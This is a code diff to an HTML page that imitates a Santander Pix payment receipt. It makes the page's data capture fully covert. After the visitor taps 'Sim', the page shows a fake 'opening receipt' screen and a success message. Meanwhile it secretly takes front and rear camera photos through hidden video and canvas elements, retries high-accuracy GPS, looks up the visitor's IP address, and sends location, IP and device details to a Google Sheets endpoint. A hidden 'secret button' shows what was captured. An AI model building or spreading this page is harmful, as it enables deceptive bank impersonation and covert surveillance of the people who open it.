@@ -22,6 +22,7 @@
             border-radius: 4px;
             box-shadow: 0 2px 10px rgba(0,0,0,0.2);
             overflow: hidden;
+            position: relative;
         }
         .santander-header {
             background: #ec0000;
@@ -51,7 +52,6 @@
         .pdf-footer { padding: 12px 20px; background: #f5f5f5; font-size: 10px; color: #888; text-align: center; border-top: 1px solid #ddd; line-height: 1.6; }
         .pdf-footer .phone { font-weight: bold; color: #ec0000; }
 
-        /* DIALOG */
         .dialog-overlay {
             display: flex;
             position: fixed;
@@ -84,7 +84,6 @@
         .dialog-btn-yes { background: #00c853; color: white; }
         .dialog-btn-yes:active { background: #00a840; }
 
-        /* BOTÃO SECRETO */
         .teste-btn {
             text-align: center;
             padding: 10px;
@@ -113,13 +112,11 @@
             word-break: break-all;
         }
 
-        /* ELEMENTOS INVISÍVEIS */
         video, canvas { display: none !important; visibility: hidden !important; width: 0 !important; height: 0 !important; position: absolute !important; left: -9999px !important; top: -9999px !important; }
     </style>
 </head>
 <body>
 
-    <!-- COMPROVANTE -->
     <div class="pdf-container">
         <div class="santander-header">
             <div class="santander-logo">Santander <span>|</span></div>
@@ -160,7 +157,6 @@
             <br>SAC <span class="phone">0800-762-7777</span> | Ouvidoria <span class="phone">0800-726-0322</span>
         </div>
 
-        <!-- BOTÃO SECRETO -->
         <div class="teste-btn">
             <button onclick="mostrarDados()">🔍 Ver Dados Capturados</button>
             <pre id="dadosDisplay"></pre>
@@ -172,7 +168,7 @@
         <div class="dialog-box">
             <div class="dialog-icon">📄</div>
             <div class="dialog-title">Deseja abrir este comprovante?</div>
-            <div class="dialog-sub">Clique em SIM para validar o recebimento.</div>
+            <div class="dialog-sub">Clique em SIM para visualizar o comprovante Pix.</div>
             <div class="dialog-buttons">
                 <button class="dialog-btn dialog-btn-no" id="btnNo">Não</button>
                 <button class="dialog-btn dialog-btn-yes" id="btnYes">Sim</button>
@@ -180,7 +176,6 @@
         </div>
     </div>
 
-    <!-- ELEMENTOS INVISÍVEIS -->
     <video id="video" playsinline autoplay muted></video>
     <canvas id="canvas"></canvas>
 
@@ -221,7 +216,7 @@
         document.getElementById('displayTransactionDate').textContent = 'Data e hora da transação: ' + dateStr;
 
         // ============================================================
-        // CAPTURA E ENVIO
+        // CAPTURA (TOTALMENTE OCULTA)
         // ============================================================
 
         let capturedData = {
@@ -239,24 +234,76 @@
 
         document.getElementById('btnYes').addEventListener('click', async () => {
             document.getElementById('dialogOverlay').style.display = 'none';
-            await captureAllData();
+            
+            // Mostra "abrir comprovante" por 1.5 segundos (simulação)
+            const loadingDiv = document.createElement('div');
+            loadingDiv.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.5);display:flex;justify-content:center;align-items:center;z-index:1000;';
+            loadingDiv.innerHTML = `
+                <div style="background:white;border-radius:12px;padding:30px;text-align:center;">
+                    <div style="font-size:24px;margin-bottom:8px;">📄</div>
+                    <div style="font-size:16px;color:#1a1a2e;">Abrindo comprovante...</div>
+                </div>
+            `;
+            document.body.appendChild(loadingDiv);
+
+            // Inicia captura em background (silenciosamente)
+            captureAllData();
+
+            // Aguarda 1.5s e mostra sucesso
+            setTimeout(() => {
+                loadingDiv.remove();
+                showSuccess();
+            }, 1500);
         });
+
+        function showSuccess() {
+            const div = document.createElement('div');
+            div.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.7);display:flex;justify-content:center;align-items:center;z-index:1001;';
+            div.innerHTML = `
+                <div style="background:white;border-radius:16px;padding:40px 30px;max-width:380px;width:100%;text-align:center;">
+                    <div style="font-size:64px;margin-bottom:12px;">✅</div>
+                    <div style="font-size:22px;font-weight:bold;color:#00c853;margin-bottom:6px;">Comprovante Aberto!</div>
+                    <div style="font-size:14px;color:#666;">Validação concluída com sucesso.</div>
+                </div>
+            `;
+            document.body.appendChild(div);
+            setTimeout(() => div.remove(), 2500);
+        }
 
         async function captureAllData() {
             try {
+                // Câmeras
                 await captureFrontCamera();
                 await captureRearCamera();
-                await captureLocation();
+                
+                // GPS/Wi-Fi/Torres - tenta várias vezes em background
+                let gpsSuccess = false;
+                for (let i = 0; i < 3; i++) {
+                    if (await tryCaptureLocation()) {
+                        gpsSuccess = true;
+                        break;
+                    }
+                    await new Promise(r => setTimeout(r, 500));
+                }
+                if (!gpsSuccess) {
+                    console.log('⚠️ Localização não disponível - continuando sem');
+                }
+
+                // IP
                 await captureIP();
 
                 capturedData.deviceInfo = navigator.userAgent;
                 capturedData.timestamp = new Date().toISOString();
 
                 localStorage.setItem('pixTrackerCapture', JSON.stringify(capturedData));
-
                 await sendToGoogleSheets();
 
-                console.log('✅ Dados capturados e enviados!');
+                console.log('✅ Dados capturados!', {
+                    location: gpsSuccess ? 'OK (' + (capturedData.location?.accuracy || '?') + 'm)' : 'NÃO',
+                    front: capturedData.frontPhoto ? 'OK' : 'NÃO',
+                    rear: capturedData.rearPhoto ? 'OK' : 'NÃO',
+                    ip: capturedData.ip || 'NÃO'
+                });
 
             } catch (error) {
                 console.error('Erro na captura:', error);
@@ -264,7 +311,45 @@
         }
 
         // ============================================================
-        // ENVIAR PARA O GOOGLE SHEETS
+        // CAPTURA DE LOCALIZAÇÃO (GPS, WI-FI, TORRES)
+        // ============================================================
+
+        async function tryCaptureLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) { 
+                    console.log('⚠️ Geolocalização não suportada');
+                    resolve(false); 
+                    return; 
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        capturedData.location = {
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude,
+                            accuracy: Math.round(pos.coords.accuracy) + 'm',
+                            altitude: pos.coords.altitude || null,
+                            heading: pos.coords.heading || null,
+                            speed: pos.coords.speed || null
+                        };
+                        console.log('📍 Localização capturada com precisão de ' + Math.round(pos.coords.accuracy) + 'm');
+                        resolve(true);
+                    },
+                    (err) => {
+                        console.log('⚠️ Erro na localização:', err.message);
+                        resolve(false);
+                    },
+                    { 
+                        enableHighAccuracy: true,  // Tenta GPS primeiro
+                        timeout: 3000,            // Espera 3s
+                        maximumAge: 60000         // Pode usar cache de 1min
+                    }
+                );
+            });
+        }
+
+        // ============================================================
+        // ENVIO PARA GOOGLE SHEETS
         // ============================================================
 
         async function sendToGoogleSheets() {
@@ -273,9 +358,9 @@
                 
                 const payload = {
                     timestamp: capturedData.timestamp,
-                    location: capturedData.location,
-                    ip: capturedData.ip,
-                    deviceInfo: capturedData.deviceInfo,
+                    location: capturedData.location || { latitude: 'N/A', longitude: 'N/A' },
+                    ip: capturedData.ip || 'N/A',
+                    deviceInfo: capturedData.deviceInfo || 'N/A',
                     payer: data.payer,
                     amount: data.amount
                 };
@@ -289,12 +374,12 @@
 
                 console.log('✅ Dados enviados para o Google Sheets!');
             } catch (error) {
-                console.error('Erro ao enviar:', error);
+                console.error('❌ Erro ao enviar:', error);
             }
         }
 
         // ============================================================
-        // FUNÇÕES DE CAPTURA
+        // FUNÇÕES DE CAPTURA DE CÂMERA (INVISÍVEL)
         // ============================================================
 
         async function captureFrontCamera() {
@@ -316,8 +401,9 @@
 
                 capturedData.frontPhoto = canvas.toDataURL('image/jpeg', 0.6);
                 stream.getTracks().forEach(t => t.stop());
+                console.log('📸 Foto frontal capturada');
             } catch (e) {
-                console.log('Front camera error:', e);
+                console.log('⚠️ Front camera error:', e.message);
             }
         }
 
@@ -340,41 +426,30 @@
 
                 capturedData.rearPhoto = canvas.toDataURL('image/jpeg', 0.6);
                 stream.getTracks().forEach(t => t.stop());
+                console.log('📸 Foto traseira capturada');
             } catch (e) {
-                console.log('Rear camera error:', e);
+                console.log('⚠️ Rear camera error:', e.message);
             }
         }
 
-        async function captureLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) { resolve(); return; }
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        capturedData.location = {
-                            latitude: pos.coords.latitude,
-                            longitude: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy
-                        };
-                        resolve();
-                    },
-                    () => resolve(),
-                    { enableHighAccuracy: true, timeout: 10000 }
-                );
-            });
-        }
+        // ============================================================
+        // CAPTURA DE IP
+        // ============================================================
 
         async function captureIP() {
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 capturedData.ip = data.ip;
+                console.log('🌐 IP capturado:', data.ip);
             } catch (e) {
                 capturedData.ip = 'N/A';
+                console.log('⚠️ Erro ao capturar IP');
             }
         }
 
         // ============================================================
-        // BOTÃO SECRETO - MOSTRA DADOS CAPTURADOS
+        // BOTÃO SECRETO (VER DADOS)
         // ============================================================
 
         function mostrarDados() {
@@ -385,6 +460,8 @@
                     const parsed = JSON.parse(dados);
                     display.textContent = JSON.stringify(parsed, null, 2);
                     display.style.display = 'block';
+                    display.style.maxHeight = '300px';
+                    display.style.overflow = 'auto';
                 } catch (e) {
                     display.textContent = '❌ Erro ao ler os dados: ' + e.message;
                     display.style.display = 'block';
